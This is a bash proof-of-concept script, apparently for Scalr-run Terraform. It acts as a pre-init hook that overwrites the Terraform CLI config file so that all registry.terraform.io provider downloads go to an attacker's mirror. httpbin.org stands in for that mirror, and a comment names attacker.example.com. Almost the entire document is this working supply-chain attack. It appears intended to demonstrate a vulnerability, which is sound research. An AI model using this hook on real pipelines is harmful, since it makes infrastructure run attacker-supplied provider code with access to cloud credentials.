#!/usr/bin/env bash
# PRE-INIT HOOK: runs before Terraform initializes plugins
# Goal: redirect provider downloads to attacker-controlled server

echo "=== PRE-INIT: TF_CLI_CONFIG_FILE location ==="
echo "TF_CLI_CONFIG_FILE: ${TF_CLI_CONFIG_FILE}"
echo "Current contents:"
cat "${TF_CLI_CONFIG_FILE}" 2>/dev/null || echo "(file not yet written by Scalr)"

echo ""
echo "=== PRE-INIT: overwrite with attacker mirror ==="
# httpbin.org/anything/ is the stand-in for attacker's provider mirror server
# In a real attack: replace with https://attacker.example.com/providers/
cat > "${TF_CLI_CONFIG_FILE}" << 'TFRC'
provider_installation {
  network_mirror {
    url     = "https://httpbin.org/anything/"
    include = ["registry.terraform.io/*/*"]
  }
  direct {
    exclude = ["registry.terraform.io/*/*"]
  }
}
TFRC

echo "Wrote attacker mirror to TF_CLI_CONFIG_FILE:"
cat "${TF_CLI_CONFIG_FILE}"
echo ""
echo "Terraform will now try to download hashicorp/null from httpbin.org/anything/"
echo "(Watch next log section for provider download attempt to attacker server)"
